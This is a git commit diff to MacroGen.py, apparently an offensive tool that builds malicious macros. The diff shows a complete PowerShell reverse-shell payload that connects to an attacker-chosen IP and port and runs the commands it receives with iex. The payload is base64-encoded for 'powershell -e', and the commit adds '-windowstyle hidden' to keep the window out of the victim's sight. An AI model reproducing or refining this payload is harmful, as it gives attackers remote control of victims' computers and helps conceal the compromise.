ae5ff7e494a0d2cb43fd7707e9ca4ca62178ccf7
0xBruno <59654121+0xBruno@users.noreply.github.com>
2021-08-12 23:07:53 -0500

    Added windowstyle hidden to hide PowerShell window

--- MacroGen.py
+++ MacroGen.py
@@ -26,7 +26,7 @@ except:
 payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 payload = payload % (ip, port)
 
-str = "powershell -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
+str = "powershell -windowstyle hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
 
 letters = string.ascii_letters
 
